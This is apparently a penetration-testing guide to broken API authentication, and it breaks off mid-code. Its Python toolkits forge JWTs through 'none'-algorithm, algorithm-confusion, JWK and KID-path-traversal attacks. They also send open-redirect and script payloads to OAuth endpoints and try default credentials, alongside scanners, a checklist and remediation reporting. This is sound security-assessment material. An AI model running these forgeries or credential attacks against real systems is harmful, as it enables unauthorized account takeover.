# API | Broken Authentication

## 1.0 Comprehensive API Broken Authentication Testing

### 1.1 Understanding API Authentication Vulnerabilities

```yaml
API Authentication Attack Vectors:
  Token-Based Vulnerabilities:
    - JWT manipulation and forgery
    - API key exposure and leakage
    - OAuth token hijacking
    - Session fixation attacks
    - Token sidejacking
    
  Credential-Based Vulnerabilities:
    - Weak password policies
    - Credential stuffing attacks
    - Brute force vulnerabilities
    - Password reset flaws
    - Default credentials usage
    
  Protocol-Level Vulnerabilities:
    - Insufficient TLS protection
    - Authentication bypass techniques
    - Race condition exploitation
    - Timing attacks
    - Replay attacks
```

### 1.2 API Authentication Testing Methodology

```python
# API Broken Authentication Testing Framework
import requests
import json
import jwt
import hashlib
import hmac
import base64
from typing import Dict, List, Optional
from concurrent.futures import ThreadPoolExecutor
import time

class APIAuthTester:
    def __init__(self, target_url, headers=None):
        self.target_url = target_url
        self.headers = headers or {}
        self.vulnerabilities = []
        self.session = requests.Session()
        
    def test_jwt_vulnerabilities(self, jwt_token):
        """Test JWT token security vulnerabilities"""
        print("Testing JWT token vulnerabilities...")
        
        vulnerabilities = []
        
        try:
            # Test 1: Algorithm confusion (none algorithm)
            decoded_token = jwt.decode(jwt_token, options={"verify_signature": False})
            header = jwt.get_unverified_header(jwt_token)
            
            # Test for "none" algorithm
            if header.get('alg') == 'none':
                vulnerabilities.append({
                    'type': 'JWT Algorithm Confusion',
                    'severity': 'High',
                    'description': 'JWT token accepts "none" algorithm',
                    'payload': jwt.encode(decoded_token, key='', algorithm='none')
                })
            
            # Test 2: Weak secret brute force
            common_secrets = ['secret', 'password', 'key', '123456', 'admin']
            for secret in common_secrets:
                try:
                    jwt.decode(jwt_token, secret, algorithms=['HS256'])
                    vulnerabilities.append({
                        'type': 'JWT Weak Secret',
                        'severity': 'High',
                        'description': f'JWT signed with weak secret: {secret}',
                        'secret': secret
                    })
                    break
                except jwt.InvalidSignatureError:
                    continue
            
            # Test 3: Token expiration
            if 'exp' not in decoded_token:
                vulnerabilities.append({
                    'type': 'JWT Missing Expiration',
                    'severity': 'Medium',
                    'description': 'JWT token has no expiration claim'
                })
            
            # Test 4: Signature verification bypass
            parts = jwt_token.split('.')
            if len(parts) == 3:
                header_b64, payload_b64, signature_b64 = parts
                
                # Modify payload and re-sign with empty signature
                modified_payload = json.loads(base64.b64decode(payload_b64 + '=='))
                modified_payload['user'] = 'admin'
                modified_payload['isAdmin'] = True
                
                modified_payload_b64 = base64.b64encode(
                    json.dumps(modified_payload).encode()
                ).decode().rstrip('=')
                
                forged_token = f"{header_b64}.{modified_payload_b64}."
                vulnerabilities.append({
                    'type': 'JWT Signature Bypass Attempt',
                    'severity': 'High',
                    'description': 'Potential signature verification bypass',
                    'forged_token': forged_token
                })
                
        except Exception as e:
            print(f"JWT testing error: {e}")
            
        return vulnerabilities

    def test_oauth_vulnerabilities(self, auth_endpoints):
        """Test OAuth 2.0 implementation vulnerabilities"""
        print("Testing OAuth 2.0 vulnerabilities...")
        
        vulnerabilities = []
        
        # Test for open redirects in authorization endpoint
        redirect_uri_payloads = [
            'https://evil.com',
            'http://localhost',
            'javascript:alert(1)',
            'data:text/html,<script>alert(1)</script>'
        ]
        
        for payload in redirect_uri_payloads:
            try:
                response = self.session.get(
                    auth_endpoints['authorization'],
                    params={
                        'response_type': 'code',
                        'client_id': 'test',
                        'redirect_uri': payload,
                        'scope': 'openid',
                        'state': 'test'
                    },
                    allow_redirects=False
                )
                
                if payload in response.headers.get('Location', ''):
                    vulnerabilities.append({
                        'type': 'OAuth Open Redirect',
                        'severity': 'Medium',
                        'description': f'Open redirect vulnerability with: {payload}',
                        'endpoint': auth_endpoints['authorization']
                    })
                    
            except Exception as e:
                continue
        
        # Test for CSRF in authorization flow
        try:
            response = self.session.get(auth_endpoints['authorization'])
            if 'state' not in response.text.lower():
                vulnerabilities.append({
                    'type': 'OAuth CSRF Vulnerability',
                    'severity': 'High',
                    'description': 'Missing state parameter in OAuth flow',
                    'endpoint': auth_endpoints['authorization']
                })
        except Exception as e:
            pass
            
        return vulnerabilities

    def test_credential_stuffing(self, login_endpoint, username_list, password_list):
        """Test for credential stuffing vulnerabilities"""
        print("Testing credential stuffing vulnerabilities...")
        
        vulnerabilities = []
        successful_logins = []
        
        # Test rate limiting
        rapid_attempts = 10
        for i in range(rapid_attempts):
            response = self.session.post(
                login_endpoint,
                json={'username': f'test{i}', 'password': 'wrongpassword'}
            )
            
            if response.status_code != 429:  # Not rate limited
                vulnerabilities.append({
                    'type': 'Missing Rate Limiting',
                    'severity': 'High',
                    'description': f'No rate limiting detected after {rapid_attempts} rapid attempts'
                })
                break
        
        # Test account lockout
        test_username = "lockout_test_user"
        for i in range(20):  # Attempt to trigger lockout
            response = self.session.post(
                login_endpoint,
                json={'username': test_username, 'password': 'wrongpassword'}
            )
            
            if 'locked' in response.text.lower() or response.status_code == 423:
                break
        else:
            vulnerabilities.append({
                'type': 'Missing Account Lockout',
                'severity': 'Medium',
                'description': 'No account lockout mechanism detected'
            })
        
        # Test credential stuffing with common credentials
        common_credentials = [
            ('admin', 'admin'),
            ('admin', 'password'),
            ('root', 'root'),
            ('test', 'test'),
            ('user', 'user')
        ]
        
        for username, password in common_credentials:
            response = self.session.post(
                login_endpoint,
                json={'username': username, 'password': password}
            )
            
            if response.status_code == 200 and 'token' in response.text:
                successful_logins.append({
                    'username': username,
                    'password': password,
                    'response': response.json()
                })
        
        if successful_logins:
            vulnerabilities.append({
                'type': 'Weak Default Credentials',
                'severity': 'Critical',
                'description': 'Successful login with default/weak credentials',
                'compromised_accounts': successful_logins
            })
            
        return vulnerabilities

    def test_password_reset_vulnerabilities(self, reset_endpoints):
        """Test password reset functionality vulnerabilities"""
        print("Testing password reset vulnerabilities...")
        
        vulnerabilities = []
        
        # Test 1: Token predictability
        test_email = "test@example.com"
        response1 = self.session.post(reset_endpoints['request'], json={'email': test_email})
        response2 = self.session.post(reset_endpoints['request'], json={'email': test_email})
        
        # Compare tokens if available in response (for testing purposes)
        if 'token' in response1.text and 'token' in response2.text:
            token1 = response1.json().get('token')
            token2 = response2.json().get('token')
            
            if token1 and token2 and token1 == token2:
                vulnerabilities.append({
                    'type': 'Predictable Password Reset Token',
                    'severity': 'High',
                    'description': 'Password reset tokens are predictable/reusable'
                })
        
        # Test 2: Token expiration
        # This would require timing analysis or checking if old tokens work
        
        # Test 3: Insecure reset token transmission
        if reset_endpoints.get('verify'):
            response = self.session.get(reset_endpoints['verify'])
            if 'token' in response.url or 'token' in response.text:
                vulnerabilities.append({
                    'type': 'Insecure Token Transmission',
                    'severity': 'Medium',
                    'description': 'Password reset token exposed in URL or response'
                })
        
        # Test 4: Account enumeration
        valid_email = "valid_user@example.com"
        invalid_email = "nonexistent_user@example.com"
        
        response_valid = self.session.post(
            reset_endpoints['request'], 
            json={'email': valid_email}
        )
        response_invalid = self.session.post(
            reset_endpoints['request'], 
            json={'email': invalid_email}
        )
        
        # Compare responses for differences that reveal account existence
        if (response_valid.status_code != response_invalid.status_code or 
            len(response_valid.text) != len(response_invalid.text)):
            vulnerabilities.append({
                'type': 'Password Reset Account Enumeration',
                'severity': 'Low',
                'description': 'Different responses reveal valid vs invalid accounts'
            })
            
        return vulnerabilities

    def test_session_management(self, protected_endpoint, auth_token):
        """Test session management vulnerabilities"""
        print("Testing session management vulnerabilities...")
        
        vulnerabilities = []
        
        # Test 1: Session fixation
        original_token = auth_token
        
        # Modify token and test if still valid
        modified_token = original_token[:-1] + 'X'  # Simple modification
        self.session.headers.update({'Authorization': f'Bearer {modified_token}'})
        
        response = self.session.get(protected_endpoint)
        if response.status_code == 200:
            vulnerabilities.append({
                'type': 'Weak Token Validation',
                'severity': 'High',
                'description': 'Modified authentication token still accepted'
            })
        
        # Test 2: Session timeout
        self.session.headers.update({'Authorization': f'Bearer {original_token}'})
        
        # Test immediate access
        response1 = self.session.get(protected_endpoint)
        
        # Simulate waiting (in real test, you'd actually wait)
        print("Note: For proper session timeout testing, wait for session expiration period")
        
        # Test 3: Concurrent session usage
        session1 = requests.Session()
        session2 = requests.Session()
        
        session1.headers.update({'Authorization': f'Bearer {original_token}'})
        session2.headers.update({'Authorization': f'Bearer {original_token}'})
        
        response1 = session1.get(protected_endpoint)
        response2 = session2.get(protected_endpoint)
        
        if response1.status_code == 200 and response2.status_code == 200:
            vulnerabilities.append({
                'type': 'Concurrent Session Usage',
                'severity': 'Medium',
                'description': 'Same token can be used concurrently from different sessions'
            })
        
        return vulnerabilities

    def comprehensive_auth_testing(self, test_scenarios):
        """Perform comprehensive authentication testing"""
        print("Starting comprehensive API authentication testing...")
        
        all_vulnerabilities = []
        
        # JWT Testing
        if test_scenarios.get('jwt_token'):
            jwt_vulns = self.test_jwt_vulnerabilities(test_scenarios['jwt_token'])
            all_vulnerabilities.extend(jwt_vulns)
        
        # OAuth Testing
        if test_scenarios.get('oauth_endpoints'):
            oauth_vulns = self.test_oauth_vulnerabilities(test_scenarios['oauth_endpoints'])
            all_vulnerabilities.extend(oauth_vulns)
        
        # Credential Stuffing Testing
        if test_scenarios.get('login_endpoint'):
            cred_vulns = self.test_credential_stuffing(
                test_scenarios['login_endpoint'],
                test_scenarios.get('username_list', []),
                test_scenarios.get('password_list', [])
            )
            all_vulnerabilities.extend(cred_vulns)
        
        # Password Reset Testing
        if test_scenarios.get('reset_endpoints'):
            reset_vulns = self.test_password_reset_vulnerabilities(
                test_scenarios['reset_endpoints']
            )
            all_vulnerabilities.extend(reset_vulns)
        
        # Session Management Testing
        if test_scenarios.get('protected_endpoint') and test_scenarios.get('auth_token'):
            session_vulns = self.test_session_management(
                test_scenarios['protected_endpoint'],
                test_scenarios['auth_token']
            )
            all_vulnerabilities.extend(session_vulns)
        
        return all_vulnerabilities

# Usage Example
tester = APIAuthTester('https://api.example.com')

test_scenarios = {
    'jwt_token': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...',
    'oauth_endpoints': {
        'authorization': 'https://api.example.com/oauth/authorize',
        'token': 'https://api.example.com/oauth/token'
    },
    'login_endpoint': 'https://api.example.com/auth/login',
    'reset_endpoints': {
        'request': 'https://api.example.com/auth/reset-password',
        'verify': 'https://api.example.com/auth/verify-reset'
    },
    'protected_endpoint': 'https://api.example.com/api/user/profile',
    'auth_token': 'bearer_token_here',
    'username_list': ['admin', 'user', 'test'],
    'password_list': ['password', '123456', 'admin']
}

vulnerabilities = tester.comprehensive_auth_testing(test_scenarios)
```

## 2.0 Advanced API Authentication Attack Techniques

### 2.1 JWT-Specific Attacks

```python
# Advanced JWT Attack Toolkit
class JWTAttacker:
    def __init__(self):
        self.vulnerabilities = []
    
    def algorithm_confusion_attack(self, jwt_token, public_key):
        """Perform algorithm confusion attacks"""
        try:
            # Decode without verification to get header and payload
            header = jwt.get_unverified_header(jwt_token)
            payload = jwt.decode(jwt_token, options={"verify_signature": False})
            
            # Try different algorithm confusion techniques
            algorithms_to_test = ['HS256', 'HS384', 'HS512', 'none']
            
            for alg in algorithms_to_test:
                try:
                    if alg == 'none':
                        # "none" algorithm attack
                        forged_token = jwt.encode(
                            payload, 
                            key='', 
                            algorithm='none',
                            headers={'alg': 'none'}
                        )
                    else:
                        # RS to HS confusion
                        forged_token = jwt.encode(
                            payload,
                            key=public_key,
                            algorithm=alg
                        )
                    
                    self.vulnerabilities.append({
                        'type': 'JWT Algorithm Confusion',
                        'algorithm': alg,
                        'forged_token': forged_token,
                        'severity': 'High'
                    })
                    
                except Exception as e:
                    continue
                    
        except Exception as e:
            print(f"Algorithm confusion attack failed: {e}")
            
        return self.vulnerabilities
    
    def jwk_header_injection(self, jwt_token, malicious_jwk):
        """Test JWK header injection vulnerabilities"""
        try:
            payload = jwt.decode(jwt_token, options={"verify_signature": False})
            
            # Inject malicious JWK in header
            headers = {
                'alg': 'RS256',
                'jwk': malicious_jwk
            }
            
            forged_token = jwt.encode(
                payload,
                key='malicious_key',
                algorithm='RS256',
                headers=headers
            )
            
            self.vulnerabilities.append({
                'type': 'JWK Header Injection',
                'description': 'Malicious JWK injected in token header',
                'forged_token': forged_token,
                'severity': 'Critical'
            })
            
        except Exception as e:
            print(f"JWK injection failed: {e}")
            
        return self.vulnerabilities
    
    def kid_header_injection(self, jwt_token, malicious_kid):
        """Test KID header injection vulnerabilities"""
        try:
            payload = jwt.decode(jwt_token, options={"verify_signature": False})
            
            headers = {
                'alg': 'HS256',
                'kid': malicious_kid  # e.g., "../../../../etc/passwd"
            }
            
            forged_token = jwt.encode(
                payload,
                key='secret',
                algorithm='HS256',
                headers=headers
            )
            
            self.vulnerabilities.append({
                'type': 'KID Header Injection',
                'description': 'Path traversal in KID parameter',
                'forged_token': forged_token,
                'severity': 'High'
            })
            
        except Exception as e:
            print(f"KID injection failed: {e}")
            
        return self.vulnerabilities

# JWT Attack Example
jwt_attacker = JWTAttacker()
jwt_token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"

# Test various attacks
jwt_attacker.algorithm_confusion_attack(jwt_token, "public_key_here")
jwt_attacker.jwk_header_injection(jwt_token, {"kty":"RSA","kid":"malicious","use":"sig"})
jwt_attacker.kid_header_injection(jwt_token, "../../../../etc/passwd")
```

### 2.2 OAuth 2.0 Exploitation

```python
# OAuth 2.0 Attack Toolkit
class OAuthAttacker:
    def __init__(self, target_domain):
        self.target_domain = target_domain
        self.vulnerabilities = []
    
    def test_authorization_code_interception(self, auth_endpoint, client_id):
        """Test for authorization code interception vulnerabilities"""
        
        # Test for code replay attacks
        test_codes = [
            '123456',
            'abcdef',
            '000000',
            '111111'
        ]
        
        for code in test_codes:
            token_response = requests.post(
                f"{self.target_domain}/oauth/token",
                data={
                    'grant_type': 'authorization_code',
                    'client_id': client_id,
                    'client_secret': 'test_secret',
                    'code': code,
                    'redirect_uri': 'https://client.com/callback'
                }
            )
            
            if token_response.status_code == 200:
                self.vulnerabilities.append({
                    'type': 'Authorization Code Prediction',
                    'severity': 'High',
                    'description': f'Predictable authorization code: {code}',
                    'token_response': token_response.json()
                })
    
    def test_pkce_bypass(self, auth_endpoint):
        """Test PKCE (Proof Key for Code Exchange) bypass"""
        
        # Test without code_challenge
        auth_url = f"{auth_endpoint}?response_type=code&client_id=test&redirect_uri=https://client.com/callback"
        
        response = requests.get(auth_url, allow_redirects=False)
        
        if response.status_code == 302:  # Redirect without PKCE
            self.vulnerabilities.append({
                'type': 'PKCE Bypass',
                'severity': 'Medium',
                'description': 'OAuth flow works without PKCE parameters'
            })
    
    def test_token_leakage(self, token_endpoint):
        """Test for access token leakage vulnerabilities"""
        
        # Test token in URL parameters
        test_token = 'test_access_token'
        response = requests.get(
            f"{self.target_domain}/api/user",
            params={'access_token': test_token}
        )
        
        if response.status_code == 200:
            self.vulnerabilities.append({
                'type': 'Token URL Leakage',
                'severity': 'Medium',
                'description': 'Access token accepted via URL parameter'
            })
        
        # Test token in response bodies
        response = requests.post(token_endpoint, data={
            'grant_type': 'client_credentials',
            'client_id': 'test',
            'client_secret': 'test'
        })
        
        if 'access_token' in response.text:
            token_info = response.json()
            if len(token_info.get('access_token', '')) < 20:  # Suspiciously short
                self.vulnerabilities.append({
                    'type': 'Weak Access Token',
                    'severity': 'Medium',
                    'description': 'Access token appears to be weak/predictable'
                })

# OAuth Attack Example
oauth_attacker = OAuthAttacker('https://api.example.com')
oauth_attacker.test_authorization_code_interception('/oauth/authorize', 'test_client')
oauth_attacker.test_pkce_bypass('/oauth/authorize')
oauth_attacker.test_token_leakage('/oauth/token')
```

## 3.0 Automated API Authentication Testing Framework

### 3.1 Comprehensive Testing Suite

```python
# API Authentication Security Scanner
class APIAuthScanner:
    def __init__(self, base_url, config):
        self.base_url = base_url
        self.config = config
        self.results = {
            'critical': [],
            'high': [],
            'medium': [],
            'low': [],
            'info': []
        }
        self.session = requests.Session()
    
    def run_comprehensive_scan(self):
        """Run comprehensive authentication security scan"""
        print("Starting API Authentication Security Scan...")
        
        scan_methods = [
            self.scan_jwt_implementation,
            self.scan_oauth_implementation,
            self.scan_password_policies,
            self.scan_session_management,
            self.scan_rate_limiting,
            self.scan_token_security,
            self.scan_credential_management
        ]
        
        for method in scan_methods:
            try:
                vulnerabilities = method()
                self.categorize_vulnerabilities(vulnerabilities)
            except Exception as e:
                print(f"Error in {method.__name__}: {e}")
        
        return self.generate_report()
    
    def scan_jwt_implementation(self):
        """Scan JWT implementation for vulnerabilities"""
        vulnerabilities = []
        
        # Test endpoints that return JWT tokens
        login_endpoint = f"{self.base_url}/auth/login"
        
        test_credentials = [
            {'username': 'test', 'password': 'test'},
            {'username': 'admin', 'password': 'admin'}
        ]
        
        for creds in test_credentials:
            response = self.session.post(login_endpoint, json=creds)
            
            if response.status_code == 200:
                token_data = response.json()
                if 'token' in token_data:
                    jwt_tester = JWTAttacker()
                    jwt_vulns = jwt_tester.algorithm_confusion_attack(
                        token_data['token'], 
                        self.config.get('public_key')
                    )
                    vulnerabilities.extend(jwt_vulns)
        
        return vulnerabilities
    
    def scan_oauth_implementation(self):
        """Scan OAuth 2.0 implementation"""
        vulnerabilities = []
        
        oauth_endpoints = [
            f"{self.base_url}/oauth/authorize",
            f"{self.base_url}/oauth/token",
            f"{self.base_url}/oauth/userinfo"
        ]
        
        for endpoint in oauth_endpoints:
            # Test for information disclosure
            response = self.session.get(endpoint)
            
            if response.status_code != 404:
                # Test for open redirects
                test_params = {
                    'redirect_uri': 'https://evil.com',
                    'state': 'test',
                    'response_type': 'code',
                    'client_id': 'test'
                }
                
                redirect_response = self.session.get(endpoint, params=test_params, allow_redirects=False)
                
                if redirect_response.status_code in [301, 302, 303, 307, 308]:
                    location = redirect_response.headers.get('Location', '')
                    if 'evil.com' in location:
                        vulnerabilities.append({
                            'type': 'OAuth Open Redirect',
                            'severity': 'Medium',
                            'endpoint': endpoint,
                            'description': 'Open redirect vulnerability in OAuth flow'
                        })
        
        return vulnerabilities
    
    def scan_password_policies(self):
        """Scan password policy enforcement"""
        vulnerabilities = []
        
        register_endpoint = f"{self.base_url}/auth/register"
        change_password_endpoint = f"{self.base_url}/auth/change-password"
        
        # Test weak password acceptance
        weak_passwords = [
            '123456',
            'password',
            'admin',
            'test',
            'qwerty'
        ]
        
        for weak_pwd in weak_passwords:
            registration_data = {
                'username': f'test_user_{weak_pwd}',
                'password': weak_pwd,
                'email': f'test_{weak_pwd}@example.com'
            }
            
            response = self.session.post(register_endpoint, json=registration_data)
            
            if response.status_code == 200:
                vulnerabilities.append({
                    'type': 'Weak Password Policy',
                    'severity': 'Medium',
                    'description': f'Weak password accepted: {weak_pwd}',
                    'password': weak_pwd
                })
        
        return vulnerabilities
    
    def scan_session_management(self):
        """Scan session management mechanisms"""
        vulnerabilities = []
        
        # Test session timeout
        protected_endpoint = f"{self.base_url}/api/user/profile"
        
        # First, obtain a valid session
        login_data = {'username': 'test', 'password': 'test'}
        login_response = self.session.post(f"{self.base_url}/auth/login", json=login_data)
        
        if login_response.status_code == 200:
            token = login_response.json().get('token')
            
            if token:
                # Test token invalidation after logout
                self.session.headers.update({'Authorization': f'Bearer {token}'})
                
                # Access protected endpoint
                response1 = self.session.get(protected_endpoint)
                
                # Logout
                logout_response = self.session.post(f"{self.base_url}/auth/logout")
                
                # Try to access protected endpoint again
                response2 = self.session.get(protected_endpoint)
                
                if response2.status_code == 200:
                    vulnerabilities.append({
                        'type': 'Session Invalidation Failure',
                        'severity': 'High',
                        'description': 'Session/token not invalidated after logout'
                    })
        
        return vulnerabilities
    
    def scan_rate_limiting(self):
        """Scan for rate limiting implementation"""
        vulnerabilities = []
        
        login_endpoint = f"{self.base_url}/auth/login"
        
        # Test rapid login attempts
        for i in range(20):
            response = self.session.post(
                login_endpoint,
                json={'username': f'test_user_{i}', 'password': 'wrong_password'}
            )
            
            if response.status_code == 429:  # Rate limited
                break
        else:
            vulnerabilities.append({
                'type': 'Missing Rate Limiting',
                'severity': 'High',
                'description': 'No rate limiting detected on login endpoint'
            })
        
        return vulnerabilities
    
    def categorize_vulnerabilities(self, vulnerabilities):
        """Categorize vulnerabilities by severity"""
        for vuln in vulnerabilities:
            severity = vuln.get('severity', 'info').lower()
            self.results[severity].append(vuln)
    
    def generate_report(self):
        """Generate comprehensive security report"""
        report = {
            'scan_summary': {
                'total_vulnerabilities': sum(len(vulns) for vulns in self.results.values()),
                'critical_count': len(self.results['critical']),
                'high_count': len(self.results['high']),
                'medium_count': len(self.results['medium']),
                'low_count': len(self.results['low']),
                'info_count': len(self.results['info'])
            },
            'vulnerabilities': self.results,
            'recommendations': self.generate_recommendations(),
            'risk_score': self.calculate_risk_score()
        }
        
        return report
    
    def generate_recommendations(self):
        """Generate security recommendations based on findings"""
        recommendations = []
        
        if self.results['critical'] or self.results['high']:
            recommendations.extend([
                "Implement strong JWT signature verification",
                "Enforce proper algorithm validation in JWT tokens",
                "Add rate limiting on authentication endpoints",
                "Implement account lockout mechanisms",
                "Use secure random token generation"
            ])
        
        if self.results['medium']:
            recommendations.extend([
                "Enforce strong password policies",
                "Implement proper session timeout",
                "Add secure flag to cookies",
                "Implement CSRF protection",
                "Use HTTPS for all authentication flows"
            ])
        
        return recommendations
    
    def calculate_risk_score(self):
        """Calculate overall risk score"""
        weights = {'critical': 5, 'high': 4, 'medium': 3, 'low': 2, 'info': 1}
        
        total_weight = 0
        for severity, vulns in self.results.items():
            total_weight += len(vulns) * weights.get(severity, 0)
        
        # Normalize score to 0-10
        max_possible_weight = sum(len(vulns) for vulns in self.results.values()) * 5
        risk_score = (total_weight / max_possible_weight * 10) if max_possible_weight > 0 else 0
        
        return min(risk_score, 10)

# Usage Example
scanner_config = {
    'public_key': '-----BEGIN PUBLIC KEY-----\n...\n-----END PUBLIC KEY-----',
    'timeout': 30,
    'threads': 5
}

scanner = APIAuthScanner('https://api.example.com', scanner_config)
report = scanner.run_comprehensive_scan()

print(f"Scan completed. Risk Score: {report['risk_score']:.1f}/10")
print(f"Critical vulnerabilities: {report['scan_summary']['critical_count']}")
```

## 4.0 API Authentication Security Headers & Best Practices

### 4.1 Security Headers Implementation

```python
# Security Headers Validator for APIs
class SecurityHeadersValidator:
    def __init__(self, base_url):
        self.base_url = base_url
        self.security_issues = []
    
    def validate_auth_endpoints_headers(self, endpoints):
        """Validate security headers on authentication endpoints"""
        
        required_headers = {
            'Strict-Transport-Security': {
                'description': 'Enforces HTTPS connections',
                'required': True
            },
            'X-Content-Type-Options': {
                'description': 'Prevents MIME type sniffing',
                'required': True,
                'expected_value': 'nosniff'
            },
            'X-Frame-Options': {
                'description': 'Prevents clickjacking',
                'required': True
            },
            'Content-Security-Policy': {
                'description': 'Prevents XSS attacks',
                'required': False  # Recommended but not always possible in APIs
            }
        }
        
        for endpoint in endpoints:
            full_url = f"{self.base_url}{endpoint}"
            
            try:
                response = requests.get(full_url)
                headers = response.headers
                
                for header, config in required_headers.items():
                    if config['required'] and header not in headers:
                        self.security_issues.append({
                            'type': 'Missing Security Header',
                            'severity': 'Medium',
                            'endpoint': endpoint,
                            'header': header,
                            'description': config['description']
                        })
                    
                    # Validate header values
                    if header in headers and 'expected_value' in config:
                        actual_value = headers[header]
                        if config['expected_value'] not in actual_value.lower():
                            self.security_issues.append({
                                'type': 'Incorrect Header Value',
                                'severity': 'Low',
                                'endpoint': endpoint,
                                'header': header,
                                'expected': config['expected_value'],
                                'actual': actual_value
                            })
                            
            except Exception as e:
                print(f"Error checking headers for {endpoint}: {e}")
        
        return self.security_issues

    def check_cors_configuration(self, endpoints):
        """Check CORS configuration for authentication endpoints"""
        
        for endpoint in endpoints:
            full_url = f"{self.base_url}{endpoint}"
            
            try:
                # Test CORS with origin header
                response = requests.options(
                    full_url,
                    headers={'Origin': 'https://evil.com'}
                )
                
                cors_headers = response.headers
                
                # Check for overly permissive CORS
                if 'Access-Control-Allow-Origin' in cors_headers:
                    allowed_origin = cors_headers['Access-Control-Allow-Origin']
                    
                    if allowed_origin == '*':
                        self.security_issues.append({
                            'type': 'Overly Permissive CORS',
                            'severity': 'High',
                            'endpoint': endpoint,
                            'description': 'CORS allows any origin (*)'
                        })
                    elif 'evil.com' in allowed_origin:
                        self.security_issues.append({
                            'type': 'CORS Origin Reflection',
                            'severity': 'Medium',
                            'endpoint': endpoint,
                            'description': 'CORS reflects arbitrary origins'
                        })
                
                # Check for sensitive headers exposure
                if 'Access-Control-Expose-Headers' in cors_headers:
                    exposed_headers = cors_headers['Access-Control-Expose-Headers']
                    sensitive_headers = ['authorization', 'cookie', 'token']
                    
                    for sensitive in sensitive_headers:
                        if sensitive in exposed_headers.lower():
                            self.security_issues.append({
                                'type': 'Sensitive Headers Exposed',
                                'severity': 'Medium',
                                'endpoint': endpoint,
                                'header': sensitive,
                                'description': f'Sensitive header {sensitive} exposed via CORS'
                            })
                            
            except Exception as e:
                print(f"Error checking CORS for {endpoint}: {e}")
        
        return self.security_issues

# Security Headers Validation Example
validator = SecurityHeadersValidator('https://api.example.com')

auth_endpoints = [
    '/auth/login',
    '/auth/register',
    '/auth/reset-password',
    '/oauth/authorize',
    '/oauth/token'
]

header_issues = validator.validate_auth_endpoints_headers(auth_endpoints)
cors_issues = validator.check_cors_configuration(auth_endpoints)

print(f"Security header issues: {len(header_issues)}")
print(f"CORS configuration issues: {len(cors_issues)}")
```

## 5.0 API Authentication Testing Checklist & Report

### 5.1 Comprehensive Testing Checklist

```markdown
# API Broken Authentication Testing Checklist

## 🔐 Authentication Mechanisms
- [ ] JWT token security validation
- [ ] OAuth 2.0 implementation testing
- [ ] API key security assessment
- [ ] Session management testing
- [ ] Multi-factor authentication bypass

## 🔑 Credential Management
- [ ] Password policy enforcement
- [ ] Credential stuffing vulnerability testing
- [ ] Brute force protection assessment
- [ ] Default credential testing
- [ ] Password reset functionality testing

## 🛡️ Token Security
- [ ] Token generation randomness
- [ ] Token expiration validation
- [ ] Token revocation mechanisms
- [ ] Token leakage prevention
- [ ] Token replay attack protection

## 🚦 Rate Limiting & Account Lockout
- [ ] Login attempt rate limiting
- [ ] Account lockout mechanisms
- [ ] Password reset rate limiting
- [ ] API endpoint rate limiting
- [ ] DDoS protection assessment

## 🔒 Session Security
- [ ] Session fixation testing
- [ ] Session timeout validation
- [ ] Concurrent session control
- [ ] Session invalidation testing
- [ ] Secure cookie attributes

## 🌐 Transport Security
- [ ] HTTPS enforcement
- [ ] HSTS implementation
- [ ] TLS configuration assessment
- [ ] Mixed content prevention
- [ ] Secure redirect validation

## 📊 Information Disclosure
- [ ] Error message information leakage
- [ ] Account enumeration testing
- [ ] Timing attack assessment
- [ ] Side-channel attack testing
- [ ] Debug information exposure

## 🎯 Business Logic Flaws
- [ ] Authentication bypass testing
- [ ] Privilege escalation assessment
- [ ] Insecure direct object references
- [ ] Mass assignment vulnerabilities
- [ ] Workflow bypass testing
```

### 5.2 Executive Security Report Template

```python
# API Authentication Security Report Generator
class SecurityReportGenerator:
    def __init__(self, scan_results, company_info):
        self.scan_results = scan_results
        self.company_info = company_info
        self.report = {}
    
    def generate_executive_summary(self):
        """Generate executive summary"""
        critical_count = len(self.scan_results.get('critical', []))
        high_count = len(self.scan_results.get('high', []))
        
        overall_risk = "Low"
        if critical_count > 0:
            overall_risk = "Critical"
        elif high_count > 2:
            overall_risk = "High"
        elif high_count > 0:
            overall_risk = "Medium"
        
        return {
            'company_name': self.company_info.get('name'),
            'assessment_date': self.company_info.get('date'),
            'overall_risk_level': overall_risk,
            'critical_vulnerabilities': critical_count,
            'high_vulnerabilities': high_count,
            'total_vulnerabilities': sum(len(vulns) for vulns in self.scan_results.values()),
            'key_findings': self.get_key_findings()
        }
    
    def get_key_findings(self):
        """Extract key findings from scan results"""
        key_findings = []
        
        # Prioritize critical and high severity issues
        for severity in ['critical', 'high']:
            for vuln in self.scan_results.get(severity, []):
                key_findings.append({
                    'title': vuln.get('type', 'Unknown'),
                    'severity': severity,
                    'description': vuln.get('description', ''),
                    'impact': self.assess_impact(vuln)
                })
        
        return key_findings[:5]  # Top 5 findings
    
    def assess_impact(self, vulnerability):
        """Assess business impact of vulnerability"""
        impact_mapping = {
            'JWT Algorithm Confusion': 'Complete authentication bypass',
            'Weak Password Policy': 'Credential stuffing attacks',
            'Missing Rate Limiting': 'Brute force attacks',
            'Session Invalidation Failure': 'Session hijacking',
            'OAuth Open Redirect': 'Phishing attacks'
        }
        
        return impact_mapping.get(vulnerability.get('type'), 'Authentication compromise')
    
    def generate_technical_details(self):
        """Generate technical details section"""
        technical_details = {}
        
        for severity, vulnerabilities in self.scan_results.items():
            technical_details[severity] = []
            for vuln in vulnerabilities:
                technical_details[severity].append({
                    'type': vuln.get('type'),
                    'description': vuln.get('description'),
                    'endpoint': vuln.get('endpoint', 'N/A'),
                    'evidence': vuln.get('evidence', ''),
                    'remediation': self.get_remediation(vuln.get('type'))
                })
        
        return technical_details
    
    def get_remediation(self, vulnerability_type):
        """Get remediation guidance for vulnerability type"""
        remediation_guide = {
            'JWT Algorithm Confusion': 'Enforce specific algorithms and validate signatures strictly',
            'Weak Password Policy': 'Implement strong password policies with minimum complexity requirements',
            'Missing Rate Limiting': 'Implement rate limiting on all authentication endpoints',
            'Session Invalidation Failure': 'Ensure proper session invalidation on logout and timeout',
            'OAuth Open Redirect': 'Validate and whitelist redirect URIs'
        }
        
        return remediation_guide.get(vulnerability_type, 'Review authentication implementation')
    
    def generate_comprehensive_report(self):
        """Generate comprehensive security report"""
        self.report = {
            'executive_summary': self.generate_executive_summary(),
            'technical_details': self.generate_technical_details(),
